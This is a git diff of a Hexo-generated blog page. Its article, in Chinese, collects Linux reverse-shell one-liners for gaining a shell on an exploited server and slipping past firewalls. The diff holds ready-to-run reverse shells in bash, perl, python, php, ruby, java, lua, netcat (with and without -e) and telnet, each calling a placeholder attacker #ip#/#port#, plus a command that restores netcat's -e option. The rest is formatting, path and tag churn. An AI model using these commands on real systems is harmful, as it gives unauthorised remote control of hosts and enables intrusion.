@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="generator" content="Hexo 3.8.0">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
@@ -117,9 +117,9 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 				
 					<a class="github" target="_blank" href="https://github.com/cckuailong/" title="github"><i class="icon-github"></i></a>
 		        
-					<a class="qq" target="_blank" href="/qq.jpg" title="qq"><i class="icon-qq"></i></a>
+					<a class="qq" target="_blank" href="/img/qq.jpg" title="qq"><i class="icon-qq"></i></a>
 		        
-					<a class="weixin" target="_blank" href="/wx.png" title="weixin"><i class="icon-weixin"></i></a>
+					<a class="weixin" target="_blank" href="/img/wx.png" title="weixin"><i class="icon-weixin"></i></a>
 		        
 					<a class="facebook" target="_blank" href="https://www.facebook.com/junjie.huo.18" title="facebook"><i class="icon-facebook"></i></a>
 		        
@@ -161,9 +161,9 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 					
 						<a class="github" target="_blank" href="https://github.com/cckuailong/" title="github"><i class="icon-github"></i></a>
 			        
-						<a class="qq" target="_blank" href="/qq.jpg" title="qq"><i class="icon-qq"></i></a>
+						<a class="qq" target="_blank" href="/img/qq.jpg" title="qq"><i class="icon-qq"></i></a>
 			        
-						<a class="weixin" target="_blank" href="/wx.png" title="weixin"><i class="icon-weixin"></i></a>
+						<a class="weixin" target="_blank" href="/img/wx.png" title="weixin"><i class="icon-weixin"></i></a>
 			        
 						<a class="facebook" target="_blank" href="https://www.facebook.com/junjie.huo.18" title="facebook"><i class="icon-facebook"></i></a>
 			        
@@ -179,7 +179,7 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Linux_shell" class="article article-type-post " itemscope="" itemprop="blogPost">
+            <article id="post-Linux_shell" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -199,12 +199,12 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
       
         <h2 id="一、前言："><a href="#一、前言：" class="headerlink" title="一、前言："></a>一、前言：</h2><p>Linux作服务器有很多的优点，所以很多服务都选择搭建在Linux服务器上，当我们发现<br>服务器漏洞并对其进行漏洞利用的时候，比较理想的情况就是拿到网站的shell，这就需<br>要用到Linux shell反弹，因为请求是从内部主动发起，所以防火墙过滤策略一般并不会<br>十分严格（参考特洛伊木马，从内部攻击）。本文收集了一些Linux的反弹shell方法，并<br>加上了一些自己的理解。</p>
 <a id="more"></a>
+
 <h2 id="二、Linux-Shell："><a href="#二、Linux-Shell：" class="headerlink" title="二、Linux Shell："></a>二、Linux Shell：</h2><p>P.S. #ip#,#port#为等待接收反弹shell的主机ip及端口（攻击者ip及端口）</p>
 <ol>
 <li>bash版本：</li>
 </ol>
-<pre><code>bash -i &gt;&amp; /dev/tcp/#ip#/#port# 0&gt;&amp;1
-</code></pre><p>-i   代表bash的interact模式，也就是交互模式，这个是反弹shell不可少的选项</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/#ip#/#port# 0&gt;&amp;1</code></pre><p>-i   代表bash的interact模式，也就是交互模式，这个是反弹shell不可少的选项</p>
 <blockquote>
 <p>&amp;   代表标准输出和标准错误输出都输出到空文件，即丢弃<br>0&gt;&amp;1 代表将标准输入定向到标准输出</p>
 </blockquote>
@@ -214,53 +214,42 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 <pre><code>perl -e &#39;use Socket;$i=&quot;#ip#&quot;;
 $p=#port#;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));
 if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);
-open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
-</code></pre><ol start="3">
+open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code></pre><ol start="3">
 <li>python版本：</li>
 </ol>
 <pre><code>python -c &#39;import socket,subprocess,os;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
 s.connect((&quot;#ip#&quot;,#port#));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 
-os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
-</code></pre><p>套接字的文件描述符赋给标准输入，输出，错误输出。</p>
+os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p>套接字的文件描述符赋给标准输入，输出，错误输出。</p>
 <ol start="4">
 <li>php版本：</li>
 </ol>
-<pre><code>php -r &#39;$sock=fsockopen(&quot;#ip#&quot;,#port#);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
-</code></pre><ol start="5">
+<pre><code>php -r &#39;$sock=fsockopen(&quot;#ip#&quot;,#port#);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><ol start="5">
 <li>ruby版本：</li>
 </ol>
 <pre><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;#ip#&quot;,#port#).to_i;
-exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
-</code></pre><ol start="6">
+exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></pre><ol start="6">
 <li>java版本：</li>
 </ol>
 <pre><code>r = Runtime.getRuntime()
 p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/#ip#/#port#;
 cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
-p.waitFor()
-</code></pre><ol start="7">
+p.waitFor()</code></pre><ol start="7">
 <li>lua版本：</li>
 </ol>
 <pre><code>lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();
-t:connect(&#39;#ip#&#39;,&#39;#port#&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;
-</code></pre><ol start="8">
+t:connect(&#39;#ip#&#39;,&#39;#port#&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</code></pre><ol start="8">
 <li>nc -e版本：</li>
 </ol>
-<pre><code>nc -e /bin/sh #ip# #port#
-</code></pre><p>nc的-c,-e选项被定义为危险选项，他们使用/bin/sh来执行nc<br>所以有的版本的nc不支持-c,-e选项（Linux发行的nc出于安全考虑，都不带-c,-e）<br>修复命令：</p>
-<pre><code>sudo rm /etc/alternatives/nc &amp;&amp; sudo ln -s /bin/nc.traditional /etc/alternatives/nc
-</code></pre><ol start="9">
+<pre><code>nc -e /bin/sh #ip# #port#</code></pre><p>nc的-c,-e选项被定义为危险选项，他们使用/bin/sh来执行nc<br>所以有的版本的nc不支持-c,-e选项（Linux发行的nc出于安全考虑，都不带-c,-e）<br>修复命令：</p>
+<pre><code>sudo rm /etc/alternatives/nc &amp;&amp; sudo ln -s /bin/nc.traditional /etc/alternatives/nc</code></pre><ol start="9">
 <li>nc无-e版本：</li>
 </ol>
 <pre><code>mknod /tmp/backpipe p
-/bin/sh 0&lt;/tmp/backpipe | nc #ip# #port# 1&gt;/tmp/backpipe
-</code></pre><p>P.S. mknod在有些系统只能root用户执行，这时可以使用mkfifo /tmp/backpipe p</p>
+/bin/sh 0&lt;/tmp/backpipe | nc #ip# #port# 1&gt;/tmp/backpipe</code></pre><p>P.S. mknod在有些系统只能root用户执行，这时可以使用mkfifo /tmp/backpipe p</p>
 <p>10.telnet版本：</p>
-<pre><code>mknod backpipe p &amp;&amp; telnet #ip# #port# 0backpipe
-</code></pre><p>11.双端口监听版本：</p>
-<pre><code>telnet #ip# #port1# | /bin/bash | telnet #ip# #port2#
-</code></pre>
+<pre><code>mknod backpipe p &amp;&amp; telnet #ip# #port# 0backpipe</code></pre><p>11.双端口监听版本：</p>
+<pre><code>telnet #ip# #port1# | /bin/bash | telnet #ip# #port2#</code></pre>
       
 
       
@@ -393,7 +382,7 @@ t:connect(&#39;#ip#&#39;,&#39;#port#&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3
       </style>
       <div id="vcomment" class="comment"></div>
 <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
 <script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <script>
     var notify = 'false' == true ? true : false;
@@ -490,6 +479,10 @@ t:connect(&#39;#ip#&#39;,&#39;#port#&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)">BGP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">Linux</a>
               </li>
              
@@ -502,23 +495,11 @@ t:connect(&#39;#ip#&#39;,&#39;#port#&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">md5</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">git</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">大数据</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">BGP</a>
+                <a href="javascript:void(0)">大数据</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -534,6 +515,10 @@ t:connect(&#39;#ip#&#39;,&#39;#port#&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Vulnerability</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">mysql</a>
               </li>
              
@@ -542,11 +527,15 @@ t:connect(&#39;#ip#&#39;,&#39;#port#&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">Vulnerability</a>
+                <a href="javascript:void(0)">md5</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)">ssl</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">git</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -570,7 +559,7 @@ t:connect(&#39;#ip#&#39;,&#39;#port#&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3
         </div>
         <ul class="search-ul">
           <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
-            缺失模块。<br>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br> npm i hexo-generator-json-content --save<br><br>
+            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
             2、在根目录_config.yml里添加配置：
 <pre style="font-size: 12px;" q-show="jsonFail">
   jsonContent:
